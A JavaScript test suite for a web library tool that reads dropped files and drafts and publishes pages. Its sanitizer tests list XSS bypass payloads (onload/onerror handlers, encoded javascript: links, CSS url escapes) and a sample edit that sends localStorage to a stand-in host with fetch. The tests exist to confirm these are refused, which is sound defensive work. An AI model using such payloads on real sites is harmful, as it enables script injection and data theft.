// The Library takes any file, and a new piece drafts on its card (Sam, 2026-11-10).
//
// Sam: "when I dropped the Adding CPL Coordinator and Noncredit Lead in MAP pdf of a ppt, apparently it didn't upload,
// but I wasn't aware until cobix hunted that down"; "I can drop files when starting at the beginning, but not when
// revising"; "need to be able to handle office docs, pdfs, google slides, videos"; and, on 2026-11-09, "I haven't been
// able to successfully create a doc from there yet--always need some sort of out side intervention".
//
// Guards the failure modes, each as Sam met it:
//   A. A PDF picked as background for a new piece: its words go with the request (record 71931018 was saved with
//      sources [] and the warning at the end of a long line).
//   B. A file with no words (a scan, a video): nothing is saved, and the box says why.
//   C. A file dropped on a card's Revise box is read and added (the card had no drop target).
//   D. Word, PowerPoint and Excel files, captions and a Google link each reach the request.
//   E. A Requested piece shows Draft it now, which calls library-revise-draft with its id; a ready Draft 1 shows
//      Publish it, which approves it for library-publish.
//   F. new_page.mjs: the new page keeps the starter's frame, carries no script, and a Google link reads by its export.
//   G. library_publish.py makes a new piece's folder; the vendored pdf.js is in place.
//
// Run: node tests/library_any_file.test.js
const fs = require("fs");
const { JSDOM } = require("jsdom");

const results = [];
function check(name, cond, why) { results.push([name, !!cond, why]); }
const SRC = fs.readFileSync("library.js", "utf8");
const PAGES = "https://cpl-initiative.github.io/cpl-project-tracker/library/";

function response(status, body) {
  return Promise.resolve({ ok: status >= 200 && status < 300, status: status,
    json: function () { return Promise.resolve(body); },
    text: function () { return Promise.resolve(typeof body === "string" ? body : JSON.stringify(body)); } });
}
const ROWS = [
  { id: "p1", slug: "ell-iet-cpl-starting-points", title: "ELL IET CPL Starting Points", kind: "visual", status: "approved",
    seen_by: "public", home: "web", url: PAGES + "ell-iet-cpl-starting-points/", version: "5", made_on: "2026-11-05", versions: [] },
  { id: "n1", slug: "adding-cpl-coordinator-noncredit-lead-to-map-mwauxci5", title: "Adding CPL Coordinator & Noncredit Lead to MAP",
    kind: "visual", status: "requested", seen_by: "colleges", home: "not_filed", url: null, versions: [], created_at: "2026-11-10T15:40:51Z",
    brief: { say: "Convert this to a visual colleges can follow.", requested_by: "Sam", requested_on: "2026-11-10" }, sources: [] },
];
function loadModule(fetchFn, rows) {
  const dom = new JSDOM('<!doctype html><html><head></head><body><div id="library-root">Loading</div></body></html>',
    { url: "https://example.org/#library/cards", runScripts: "dangerously" });
  const w = dom.window, writes = [];
  const data = JSON.parse(JSON.stringify(rows || ROWS));
  w.fetch = function (url, init) {
    init = init || {};
    if (fetchFn) { const r = fetchFn(String(url), init, writes, data); if (r) return r; }
    if (init.method && init.method !== "GET") {
      const body = JSON.parse(init.body || "{}");
      writes.push({ url: String(url), method: init.method, body: body, headers: init.headers });
      const hit = /cpl_library\?id=eq\.([\w-]+)$/.exec(String(url));
      if (init.method === "PATCH" && hit) data.forEach(function (r) { if (r.id === hit[1]) Object.assign(r, body); });
      return response(201, [Object.assign({ id: "new1" }, body)]);
    }
    return response(200, data);
  };
  w.localStorage.setItem("cpl_team_pass", "p");
  w.localStorage.setItem("cpl_library_author", "Sam");
  w.JSZip = require("../jszip.min.js");
  const s = w.document.createElement("script"); s.textContent = SRC; w.document.body.appendChild(s);
  return { w: w, doc: w.document, writes: writes, data: data, M: w.CPL_LIBRARY, root: w.document.getElementById("library-root") };
}
const tick = () => new Promise((r) => setTimeout(r, 10));
async function until(f, n) { for (let i = 0; i < (n || 200); i++) { if (f()) return true; await tick(); } return !!f(); }
function click(w, el) { el.dispatchEvent(new w.MouseEvent("click", { bubbles: true })); }
function fileOf(name, bytes) {
  return { name: name, arrayBuffer: () => Promise.resolve(bytes), text: () => Promise.resolve(Buffer.from(bytes).toString("utf8")) };
}
function drop(m, target, file) {
  const ev = new m.w.Event("drop", { bubbles: true, cancelable: true });
  Object.defineProperty(ev, "dataTransfer", { value: { files: [file] } });
  target.dispatchEvent(ev);
}
// pdf.js, stubbed: two pages of the test deck's words, or none (a scan).
function pdfStub(pages) {
  return { getDocument: function () { return { promise: Promise.resolve({ numPages: pages.length, getPage: function (n) {
    return Promise.resolve({ getTextContent: function () { return Promise.resolve({ items: pages[n - 1] }); } }); } }) }; } };
}
const PDF_PAGES = [
  [{ str: "Adding Your CPL Coordinator", hasEOL: true }, { str: "and Noncredit Lead in the User Module", hasEOL: true }],
  [{ str: "1. Log in to MAP.", hasEOL: true }, { str: "3. Navigate to Settings > Users.", hasEOL: false }],
];
async function zipOf(files) {
  const JSZip = require("../jszip.min.js"), z = new JSZip();
  Object.keys(files).forEach((k) => z.file(k, files[k]));
  return z.generateAsync({ type: "uint8array" });
}
const A = 'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"';
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const S = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"';
function startNew(m, file, instr, title) {
  drop(m, m.doc.getElementById("lib-drop"), file);
  const bg = m.doc.getElementById("lc-use-background");
  if (bg) { bg.checked = true; bg.dispatchEvent(new m.w.Event("change", { bubbles: true })); }
  m.doc.getElementById("lc-instr").value = instr || "Convert this to a visual colleges can follow.";
  m.doc.getElementById("ls-title").value = title || "A new piece";
  click(m.w, m.doc.getElementById("lib-go"));
}
const posts = (m) => m.writes.filter((x) => x.method === "POST" && /\/rest\/v1\/cpl_library$/.test(x.url));

(async function () {
  // ── A. A PDF as background for a new piece ──
  {
    const m = loadModule(); await m.M.activate(); await tick();
    m.w.pdfjsLib = pdfStub(PDF_PAGES);
    startNew(m, fileOf("Adding_CPL_Coordinator__Noncredit_Lead_to_the_User_Module_.pdf", new Uint8Array([37, 80, 68, 70])), null, "Adding CPL Coordinator");
    await until(() => posts(m).length);
    const src = (posts(m)[0] || { body: {} }).body.sources || [];
    check("A ⭐ a PDF picked as background saves its words with the request", src.length === 1 && /^Page 1\nAdding Your CPL Coordinator\nand Noncredit Lead/.test(src[0].text || "") && /Page 2\n1\. Log in to MAP\./.test(src[0].text || ""), JSON.stringify(src).slice(0, 300));
    check("A the request names how many words it read", /Read \d+ words from Adding_CPL_Coordinator/.test(m.root.textContent));
    check("A the page says the next step is Draft it now on the card, not a session", /Press Draft it now on its card/.test(m.root.textContent));
  }
  // ── B. A file with no words: nothing saved, said plainly ──
  {
    const m = loadModule(); await m.M.activate(); await tick();
    m.w.pdfjsLib = pdfStub([[], []]);
    startNew(m, fileOf("scan.pdf", new Uint8Array([1])));
    await until(() => /Nothing was saved/.test(m.root.textContent));
    check("B ⭐ a PDF with no words (a scan) saves nothing and says so", posts(m).length === 0 && /scan\.pdf has no words this page can read[\s\S]*Nothing was saved/.test(m.root.textContent));
    startNew(m, fileOf("walkthrough.mp4", new Uint8Array([1])));
    await until(() => /walkthrough\.mp4 is a video/.test(m.root.textContent));
    check("B a video asks for its captions or a transcript, and saves nothing", posts(m).length === 0 && /walkthrough\.mp4 is a video[\s\S]*\.vtt or \.srt/.test(m.root.textContent));
    startNew(m, fileOf("old.ppt", new Uint8Array([1])));
    await until(() => /old\.ppt is an older PowerPoint/.test(m.root.textContent));
    check("B an older Office file says to save it as the new format", posts(m).length === 0 && /Save it from PowerPoint as \.pptx/.test(m.root.textContent));
  }
  // ── C. A file dropped on a card's Revise box ──
  {
    const m = loadModule(); await m.M.activate(); await tick();
    m.w.pdfjsLib = pdfStub(PDF_PAGES);
    const rev = m.root.querySelector('[data-revise="p1"]');
    check("C the public piece offers Revise", !!rev);
    if (rev) {
      click(m.w, rev); await tick();
      const box = m.root.querySelector('form[data-cboxform="p1"]');
      check("C its Revise box opens", !!box);
      const over = new m.w.Event("dragover", { bubbles: true, cancelable: true });
      box.dispatchEvent(over);
      check("C ⭐ the Revise box is a drop target (it takes the drag, so the browser does not open the file)", over.defaultPrevented === true);
      drop(m, box, fileOf("User_Module.pdf", new Uint8Array([1])));
      await until(() => (m.M._state.src.cb || []).length);
      const cb = m.M._state.src.cb || [];
      check("C ⭐ a PDF dropped on it is read and listed as a document to work from", cb.length === 1 && /Log in to MAP/.test(cb[0].text || "") &&
        /User Module/.test(m.root.querySelector('form[data-cboxform="p1"]').textContent), JSON.stringify(cb).slice(0, 200));
      check("C its label names what it reads", /a Word document, a deck, a PDF or a text file is read here/.test(SRC));
    }
  }
  // ── D. Office files, captions and a Google link ──
  {
    const deck = await zipOf({ "ppt/slides/slide2.xml": "<p:sld " + A + " xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"><a:p><a:r><a:t>Navigate to the User Module</a:t></a:r></a:p></p:sld>",
      "ppt/slides/slide1.xml": "<p:sld " + A + " xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"><a:p><a:r><a:t>Adding Your CPL Coordinator</a:t></a:r></a:p></p:sld>",
      "ppt/notesSlides/notesSlide2.xml": "<p:notes " + A + " xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"><a:p><a:r><a:t>Start at Settings.</a:t></a:r></a:p></p:notes>" });
    const word = await zipOf({ "word/document.xml": "<w:document " + W + "><w:body><w:p><w:r><w:t>Step one: log in.</w:t></w:r></w:p></w:body></w:document>" });
    const book = await zipOf({ "xl/sharedStrings.xml": "<sst " + S + "><si><t>College</t></si><si><t>Coordinator</t></si></sst>",
      "xl/workbook.xml": "<workbook " + S + "><sheets><sheet name=\"Contacts\"/></sheets></workbook>",
      "xl/worksheets/sheet1.xml": "<worksheet " + S + "><sheetData><row><c t=\"s\"><v>0</v></c><c t=\"s\"><v>1</v></c></row><row><c t=\"inlineStr\"><is><t>Chaffey</t></is></c><c><v>2</v></c></row></sheetData></worksheet>" });
    const vtt = new TextEncoder().encode("WEBVTT\n\n1\n00:00:01.000 --> 00:00:03.000\nOpen the <b>Main Menu</b>.\n\n2\n00:00:03.000 --> 00:00:05.000\nChoose Users.\n");
    const cases = [["deck.pptx", deck, /^Slide 1\nAdding Your CPL Coordinator\n\nSlide 2\nNavigate to the User Module\nSpeaker notes: Start at Settings\.$/],
      ["memo.docx", word, /Step one: log in\./], ["contacts.xlsx", book, /^Sheet: Contacts\nCollege\tCoordinator\nChaffey\t2$/],
      ["walkthrough.vtt", vtt, /^Open the Main Menu\.\nChoose Users\.$/]];
    for (const c of cases) {
      const m = loadModule(); await m.M.activate(); await tick();
      startNew(m, fileOf(c[0], c[1]));
      await until(() => posts(m).length);
      const t = (((posts(m)[0] || { body: {} }).body.sources || [])[0] || {}).text || "";
      check("D ⭐ " + c[0] + "'s words go with the request", c[2].test(t), JSON.stringify(t));
    }
    const m = loadModule(); await m.M.activate(); await tick();
    m.doc.getElementById("lc-link").value = "https://docs.google.com/presentation/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/edit";
    m.doc.getElementById("lc-instr").value = "Turn this deck into a visual.";
    m.doc.getElementById("ls-title").value = "From Slides";
    click(m.w, m.doc.getElementById("lib-go"));
    await until(() => posts(m).length);
    const gs = ((posts(m)[0] || { body: {} }).body.sources || [])[0] || {};
    check("D ⭐ a Google Slides link with instructions is a document to work from (not a piece to file)", /docs\.google\.com\/presentation/.test(gs.url || ""), JSON.stringify(gs));
  }
  // ── E. A new piece drafts on its card, then publishes ──
  {
    let drafted = null;
    const m = loadModule(function (url, init, writes, data) {
      if (/functions\/v1\/library-revise-draft/.test(url)) {
        drafted = { body: JSON.parse(init.body), headers: init.headers };
        data[1].regen = { requested_at: "2026-11-10T18:00:00Z", requested_by: "Sam", new_piece: true, ready_at: "2026-11-10T18:01:00Z", draft_id: "11111111-1111-1111-1111-111111111111" };
        return response(200, { draft_id: "11111111-1111-1111-1111-111111111111", summary: "Five steps.", new_piece: true });
      }
      return null;
    });
    await m.M.activate(); await tick();
    const form = m.root.querySelector('form[data-draftnowform="n1"]');
    check("E ⭐ a Requested piece with a brief shows Draft it now", !!form && /Nothing is public until you press Publish it/.test(m.root.textContent));
    if (form) {
      form.dispatchEvent(new m.w.Event("submit", { bubbles: true, cancelable: true }));
      await until(() => drafted && m.root.querySelector('form[data-regenokform="n1"]'));
      check("E it sends the record's id and the name, with the team phrase", drafted && drafted.body.id === "n1" && drafted.body.by === "Sam" && drafted.headers["x-team-pass"] === "p");
      const pub = m.root.querySelector('form[data-regenokform="n1"]');
      check("E ⭐ a ready Draft 1 offers Open the draft and Publish it", !!pub && /Publish it/.test(pub.textContent) && !!m.root.querySelector('[data-draftopen="11111111-1111-1111-1111-111111111111"]') && /Draft 1 is ready to review/.test(m.root.textContent));
      if (pub) {
        pub.dispatchEvent(new m.w.Event("submit", { bubbles: true, cancelable: true }));
        await until(() => m.writes.some((x) => x.method === "PATCH" && x.body.regen && x.body.regen.approved_at));
        const p = m.writes.filter((x) => x.method === "PATCH" && x.body.regen && x.body.regen.approved_at)[0];
        check("E ⭐ Publish it approves the draft for library-publish, keeping new_piece", !!p && p.body.regen.new_piece === true && p.body.regen.approved_by === "Sam");
      }
    }
    // Sam's own request 71931018 was saved with no document: its card takes the PDF now, dropped on it or chosen.
    const add = loadModule(); await add.M.activate(); await tick();
    add.w.pdfjsLib = pdfStub(PDF_PAGES);
    const zone = add.root.querySelector('[data-newdrop="n1"]');
    check("E ⭐ a Requested card is a drop target and offers Add a document", !!zone && !!add.root.querySelector('input[data-newdoc="n1"]') && /Add a document/.test(zone.textContent));
    if (zone) {
      drop(add, zone, fileOf("Adding_CPL_Coordinator.pdf", new Uint8Array([1])));
      await until(() => add.writes.some((x) => x.method === "PATCH" && x.body.sources));
      const pw = add.writes.filter((x) => x.method === "PATCH" && x.body.sources)[0];
      check("E ⭐ a PDF dropped on it saves its words to the record's documents at once", !!pw && /cpl_library\?id=eq\.n1$/.test(pw.url) && /Log in to MAP/.test((pw.body.sources[0] || {}).text || ""));
      await until(() => /Press Draft it now/.test(add.root.textContent));
      check("E and says to press Draft it now", /Added Adding_CPL_Coordinator\.pdf \(\d+ words read\)\. Press Draft it now\./.test(add.root.textContent));
    }
    const none = loadModule(null, [Object.assign({}, ROWS[1], { brief: { requested_by: "Sam" }, sources: [] })]);
    await none.M.activate(); await tick();
    check("E a Requested piece with nothing to draft from says what to add", !none.root.querySelector('form[data-draftnowform="n1"]') && /Say what it must say \(Edit record\), or add a document/.test(none.root.textContent));
  }
  // ── E2. Changes after the first draft (Sam, 2026-11-11: "there doesn't appear to be any way to add new
  //        instructions when I click edit"). A ready Draft 1 takes instructions on its card, and the function
  //        edits that draft; the piece's documents stay on the record.
  {
    const D1 = "11111111-1111-1111-1111-111111111111", D2 = "22222222-2222-2222-2222-222222222222";
    const ready = Object.assign({}, ROWS[1], { sources: [{ title: "Deck", url: null, text: "Log in to MAP." }],
      regen: { requested_at: "2026-11-10T18:00:00Z", requested_by: "Sam", publish: "show", new_piece: true, ready_at: "2026-11-10T18:01:00Z", draft_id: D1 } });
    let sent = null;
    const m = loadModule(function (url, init, writes, data) {
      if (/functions\/v1\/library-revise-draft/.test(url)) {
        sent = JSON.parse(init.body);
        data[0].regen = Object.assign({}, data[0].regen, { new_piece: true, ready_at: "2026-11-11T18:01:00Z", draft_id: D2 });
        return response(200, { draft_id: D2, summary: "Added the note.", new_piece: true });
      }
      if (/cpl_library_drafts/.test(url)) return response(200, []);
      return null;
    }, [ready]);
    await m.M.activate(); await tick();
    const ask = m.root.querySelector('[data-revise="n1"]');
    check("E2 ⭐ a ready Draft 1 offers Ask for changes beside Open the draft and Publish it",
      !!ask && /Ask for changes/.test(ask.textContent) && !!m.root.querySelector('[data-draftopen="' + D1 + '"]') && !!m.root.querySelector('form[data-regenokform="n1"]'));
    if (ask) {
      click(m.w, ask);
      const box = m.root.querySelector('form[data-cboxform="n1"]');
      check("E2 ⭐ it opens the box on the card, drafting here", !!box && /Changes to Draft 1 of/.test(box.textContent) && /Draft it now/.test(box.textContent) && !/Send to a session/.test(box.textContent) && /Start over from the brief/.test(box.textContent));
      if (box) {
        m.doc.getElementById("cb-instr-n1").value = "Add a note under step 3 about the Student Contact box.";
        box.dispatchEvent(new m.w.Event("submit", { bubbles: true, cancelable: true }));
        await until(() => sent);
        const w = m.writes.filter((x) => x.method === "PATCH" && x.body.regen && x.body.regen.based_on_draft)[0];
        check("E2 ⭐ the request builds on Draft 1 and keeps it listed", !!w && w.body.regen.based_on_draft === D1 && w.body.regen.earlier.length === 1 && w.body.regen.earlier[0].draft_id === D1 && /Student Contact/.test(w.body.refresh_note));
        check("E2 ⭐ the piece's documents stay on the record", !!w && w.body.sources.length === 1 && /Log in to MAP/.test(w.body.sources[0].text));
        check("E2 ⭐ and the draft is made at once, here", !!sent && sent.id === "n1" && sent.by === "Sam");
        await until(() => /Draft 2 is ready to review/.test(m.root.textContent));
        check("E2 the card then names Draft 2", /Draft 2 is ready to review/.test(m.root.textContent) && !!m.root.querySelector('[data-draftopen="' + D2 + '"]'));
      }
    }
    const fn = fs.readFileSync("chatbox/supabase/functions/library-revise-draft/index.ts", "utf8");
    check("E2 ⭐ the function edits a new piece's draft when the request names one, and keeps new_piece for the publisher",
      /if \(isNew && !baseDraft\) return draftNew\(/.test(fn) && /\.\.\.\(isNew \? \{ new_piece: true \} : \{\}\)/.test(fn));
  }
  // ── F. new_page.mjs and the function ──
  {
    const np = await import("../chatbox/supabase/functions/library-revise-draft/new_page.mjs");
    const starter = fs.readFileSync("library/" + np.STARTER_SLUG + "/index.html", "utf8");
    const main = '<main id="main"><div class="hero"><div class="hero-in"><h1>Adding Your CPL Contacts</h1></div></div><div class="body"><section aria-labelledby="h-a"><h2 id="h-a">Steps</h2><ol class="cards four steps"><li class="card">Log in to MAP.</li></ol></section></div></main>';
    const out = np.buildNewPage(starter, "adding-cpl-coordinator-noncredit-lead-to-map-mwauxci5", { title: "Adding Your CPL Contacts", description: "How to add them.", main: main, published: "Published by the Chancellor's Office. Draft 1, November 10, 2026." });
    const h = out.html || "";
    check("F ⭐ a new page keeps the starter's frame: header, theme line, foot and Ask Sierra", /<header class="cplh"/.test(h) && h.includes('localStorage.getItem("cpl_theme")') && h.includes("../../sierra/sidebar.js") && /<footer class="foot">/.test(h));
    check("F it takes the new title, description, main and publication line", /<title>Adding Your CPL Contacts<\/title>/.test(h) && /content="How to add them\."/.test(h) && h.includes("Log in to MAP.") && /Draft 1, November 10, 2026\./.test(h) && !/Six ways noncredit learning/.test(h));
    check("F none of the starter's own words or its brief note survive", !/record 5e29e1d3/.test(h) && !/Chancellor Sonya Christian named these bridges/.test(h));
    check("F ⭐ a main with a script, a handler or two h1s is refused", !!np.buildNewPage(starter, "x-y", { title: "T", main: '<main id="main"><h1>T</h1><script>1</script></main>' }).error &&
      !!np.buildNewPage(starter, "x-y", { title: "T", main: '<main id="main"><h1 onclick="x()">T</h1></main>' }).error && !!np.buildNewPage(starter, "x-y", { title: "T", main: '<main id="main"><h1>T</h1><h1>U</h1></main>' }).error);
    // COBIx on #3077 (2026-11-10): each of these passed the first, denylist check. The allowlist refuses every one.
    const bypass = ['<svg/onload=alert(1)>', '<img/src=x/onerror=alert(1)>', '<a href="java&#115;cript:alert(1)">x</a>', '<a href="&#x6A;avascript:x">x</a>',
      '<a href=" javascript:x">x</a>', '<meta http-equiv="refresh" content="0;url=https://x.example">', '<base href="https://x.example/">',
      '<a href="data:text/html,x">x</a>', '<style>p{background:url(https://x.example/a)}</style>', '<p onclick="x()">a</p>', '<!-- note -->', '<p style="color:red">a</p>'];
    const wrap = (x) => '<main id="main"><h1>T</h1>' + x + '</main>';
    const passed = bypass.filter((x) => np.mainProblems(wrap(x)).length === 0);
    check("F ⭐ every bypass COBIx found is refused by the allowlist", passed.length === 0, JSON.stringify(passed));
    check("F a plain page with the starter's classes, a link and an ampersand passes", np.mainProblems(wrap('<div class="cards"><p class="card" aria-label="Step">Log in &amp; open <a href="https://map.rccd.edu/" target="_blank" rel="noopener">MAP</a>.<br></p></div>')).length === 0);
    const { execFileSync } = require("child_process");
    const py = execFileSync("python3", ["-c", "import sys,json;sys.path.insert(0,'scripts');import library_publish as lp;print(json.dumps([len(lp.main_problems(x))>0 for x in json.load(sys.stdin)]))"],
      { input: JSON.stringify(bypass.map(wrap).concat([wrap('<p class="card">ok</p>')])) }).toString();
    const flags = JSON.parse(py);
    check("F ⭐ library_publish.py refuses the same pages before it writes a new piece (the second gate), and passes a clean one",
      flags.slice(0, bypass.length).every(Boolean) && flags[bypass.length] === false, py);
    // The revision path too (COBIx's second note on #3077): the same strings sent in as edits to a real public page.
    const ae = await import("../chatbox/supabase/functions/library-revise-draft/apply_edits.mjs");
    const live = fs.readFileSync("library/ell-iet-cpl-starting-points/index.html", "utf8");
    const anchor = (live.match(/<h1[^>]*>[^<]{3,}<\/h1>/) || [""])[0];
    const asEdit = (x) => ae.applyEdits(live, [{ old: anchor, new: anchor + x }]);
    const editPassed = bypass.filter((x) => x !== "<!-- note -->").concat(['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']).filter((x) => !asEdit(x).error);
    check("F ⭐ every one is refused as a revision edit too", !!anchor && editPassed.length === 0, JSON.stringify(editPassed));
    check("F a plain revision edit still applies", !!anchor && !asEdit('<p>Updated December 9.</p>').error);
    const split = ae.applyEdits('<p>A</p><p>B</p>', [{ old: "<p>A</p>", new: "<p>A</p><scr" }, { old: "<p>B</p>", new: "ipt>alert(1)</script><p>B</p>" }]);
    check("F two edits cannot build a script between them (the whole page is counted)", !!split.error && /add a script/.test(split.error), split.error);
    const pyr = execFileSync("python3", ["-c", "import sys,json;sys.path.insert(0,'scripts');import library_publish as lp;d=json.load(sys.stdin);print(json.dumps([lp.added_risks(d['live'],d['live'].replace(d['a'],d['a']+x)) for x in d['xs']]))"],
      { input: JSON.stringify({ live: live, a: anchor, xs: ['<script>alert(1)</script>', '<svg/onload=alert(1)>', '<a href="java&#115;cript:x">x</a>', '<meta http-equiv="refresh">', '<p>Plain.</p>'] }) }).toString();
    const pr = JSON.parse(pyr);
    check("F ⭐ library_publish.py refuses a revision that adds risky markup, and passes a plain one", pr.slice(0, 4).every((x) => x.length > 0) && pr[4].length === 0, pyr);
    // COBIx's third note on #3077: a count let an edit rewrite code inside a script the page already has, or repoint
    // sidebar.js; the page's scripts, handlers and sources are now frozen, string for string.
    const t0 = live.indexOf("(function(){var t=null;try{t=localStorag"), in40 = live.slice(t0, t0 + 40);
    const frozenCases = [
      ["code added inside the theme script", in40, "fetch('https://x.example/?'+JSON.stringify(localStorage));" + in40],
      ["sidebar.js repointed to another host", 'src="../../sierra/sidebar.js"', 'src="//x.example/a.js"'],
    ];
    const handlerPage = '<p>Hi</p><button onclick="go()">Go</button>';
    const frozenPassed = frozenCases.filter((c) => !ae.applyEdits(live, [{ old: c[1], new: c[2] }]).error).map((c) => c[0]);
    if (ae.applyEdits(handlerPage, [{ old: 'onclick="go()"', new: 'onclick="fetch(1)"' }]).error === undefined) frozenPassed.push("an existing handler rewritten");
    check("F ⭐ an edit cannot change a script, a handler or a source the page already has", t0 > 0 && frozenPassed.length === 0, JSON.stringify(frozenPassed));
    const cssAt = live.indexOf("{", live.indexOf("<style")) + 1, cssOld = live.slice(cssAt, cssAt + 30);
    check("F a layout edit to the page's styles still applies (CSS runs no code)", !ae.applyEdits(live, [{ old: cssOld, new: "--extra:1;" + cssOld }]).error);
    check("F but a style edit that adds a url( or an @import is refused", !!ae.applyEdits(live, [{ old: cssOld, new: "background:url(https://x.example/p.png);" + cssOld }]).error);
    // COBIx's fourth note: the same host reached without a plain url( or @import.
    const cssSneak = ["background:\\75rl(//x.example/p.png);", "background-image:image-set(\"//x.example/p.png\" 1x);", "@\\69mport '//x.example/a.css';", "@font-face{font-family:x;src:url(//x.example/f.woff)}"];
    const sneakPassed = cssSneak.filter((x) => !ae.applyEdits(live, [{ old: cssOld, new: x + cssOld }]).error);
    const styled = '<p style="color:red">Hi</p>';
    if (!ae.applyEdits(styled, [{ old: 'color:red', new: 'background:&#117;rl(//x.example/p.png)' }]).error) sneakPassed.push("an entity inside style=");
    check("F ⭐ a style edit that reaches a host by an escape, image-set(, @font-face or an entity is refused", sneakPassed.length === 0, JSON.stringify(sneakPassed));
    const pys = JSON.parse(execFileSync("python3", ["-c", "import sys,json;sys.path.insert(0,'scripts');import library_publish as lp;d=json.load(sys.stdin);print(json.dumps([len(lp.added_risks(d['live'],d['live'].replace(d['o'],x+d['o'],1)))>0 for x in d['xs']]))"],
      { input: JSON.stringify({ live: live, o: cssOld, xs: cssSneak }) }).toString());
    check("F and library_publish.py refuses the same", pys.every(Boolean), JSON.stringify(pys));
    const pyf = execFileSync("python3", ["-c", "import sys,json;sys.path.insert(0,'scripts');import library_publish as lp;d=json.load(sys.stdin);print(json.dumps([lp.added_risks(d['live'],d['live'].replace(o,n,1)) for o,n in d['ed']]))"],
      { input: JSON.stringify({ live: live, ed: frozenCases.map((c) => [c[1], c[2]]).concat([[cssOld, "--extra:1;" + cssOld], [cssOld, "background:url(https://x.example/p.png);" + cssOld]]) }) }).toString();
    const pf = JSON.parse(pyf);
    check("F ⭐ library_publish.py freezes the same parts, and lets the same style edit through", pf[0].length > 0 && pf[1].length > 0 && pf[2].length === 0 && pf[3].length > 0, pyf);
    check("F a Google Docs, Slides or Sheets link reads by its plain-text export, and nothing else is fetched",
      np.googleExport("https://docs.google.com/presentation/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/edit#slide=id.p") === "https://docs.google.com/presentation/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/export/txt" &&
      np.googleExport("https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/edit") === "https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/export?format=txt" &&
      np.googleExport("https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/edit#gid=42") === "https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/export?format=csv&gid=42" &&
      np.googleExport("https://evil.example/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012") === null);
    const FN = fs.readFileSync("chatbox/supabase/functions/library-revise-draft/index.ts", "utf8");
    check("F the function drafts a Requested piece with no page from the starter, and stores new_piece on the record",
      /const isNew = r\.status === "requested" && !r\.url/.test(FN) && /draftNew\(/.test(FN) && /new_piece: true, ready_at/.test(FN) && /based_on: "starter "/.test(FN));
    check("F it still publishes nothing itself", !/library\/.*index\.html/.test(FN.split("draftNew(r: any")[1] || "x") && !/contents\/library/.test(FN));
  }
  // ── G. The publish run and the vendored reader ──
  {
    const PUB = fs.readFileSync("scripts/library_publish.py", "utf8");
    check("G library_publish.py makes a new piece's folder, and refuses to write over another page's", /is_new_piece\(r\)/.test(PUB) && /mkdir\(parents=True/.test(PUB) && /already holds another page/.test(PUB));
    check("G pdf.js is vendored with its license, and loaded only when a PDF is read", fs.existsSync("vendor/pdfjs/pdf.min.mjs") && fs.existsSync("vendor/pdfjs/pdf.worker.min.mjs") &&
      /Apache License/.test(fs.readFileSync("vendor/pdfjs/LICENSE", "utf8")) && /import\(new URL\(PDFJS/.test(SRC) && /isEvalSupported: false/.test(SRC));
  }
})().catch(function (e) { check("driver threw: " + (e && e.stack), false); }).then(function () {
  let failed = 0;
  results.forEach(function (r) { if (!r[1]) failed++; console.log((r[1] ? "ok   " : "FAIL ") + r[0] + (r[1] || !r[2] ? "" : "\n       " + r[2])); });
  console.log("\nlibrary_any_file.test.js: " + (results.length - failed) + "/" + results.length + " checks passed");
  process.exit(failed ? 1 : 0);
});
